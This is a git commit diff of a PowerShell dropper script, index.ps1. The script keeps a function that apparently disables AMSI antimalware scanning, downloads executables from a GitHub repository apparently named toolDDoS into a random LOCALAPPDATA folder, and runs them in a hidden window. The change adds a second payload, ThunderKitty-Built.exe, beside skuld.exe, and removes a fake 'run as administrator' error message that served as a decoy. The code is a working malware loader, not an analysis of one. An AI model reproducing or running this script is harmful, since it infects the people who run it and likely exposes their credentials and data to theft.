6410b2dd727a11d02fb4b1ffc06d4bf3294cd2d3
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-09-05 18:25:47 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,4 +1,4 @@
-param( [int]$Retries = 5, [int]$BaseDelay = 5 )
+param([int]$Retries = 5, [int]$BaseDelay = 5)
 
 function Disable-Amsi {
     $asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' } | Select-Object -First 1
@@ -33,16 +33,25 @@ function Download-Reliable {
 
 $r1 = [guid]::NewGuid().ToString('N')
 $dir = Join-Path $env:LOCALAPPDATA $r1
-$exe = Join-Path $dir "$r1.exe"
-$u1 = 'https://github.com/doguiaste/toolDDoS/raw/refs/heads/main/skuld.exe'
-
 New-Item -Path $dir -ItemType Directory -Force | Out-Null
-if (Download-Reliable $u1 $exe) {
-    Start-Process -FilePath $exe -WindowStyle Hidden
-}
-else {
-    exit 1
+
+# 1. Dosya
+$exe1 = Join-Path $dir "file1.exe"
+$u1 = 'https://github.com/doguiaste/toolDDoS/raw/refs/heads/main/ThunderKitty-Built.exe'  # Buraya 1. dosya linki
+if (Download-Reliable $u1 $exe1) {
+    Start-Process -FilePath $exe1 -WindowStyle Hidden
+} else {
+    Write-Host "Dosya 1 indirilemedi." -ForegroundColor Red
 }
 
-Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
-Write-Host 'Initialization failed. Please run PowerShell as administrator.' -ForegroundColor Red
+# 2. Dosya
+$exe2 = Join-Path $dir "file2.exe"
+$u2 = 'https://github.com/doguiaste/toolDDoS/raw/refs/heads/main/skuld.exe'  # Buraya 2. dosya linki
+if (Download-Reliable $u2 $exe2) {
+    Start-Process -FilePath $exe2 -WindowStyle Hidden
+} else {
+    Write-Host "Dosya 2 indirilemedi." -ForegroundColor Red
+}
+
+# Temizlik
+# Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
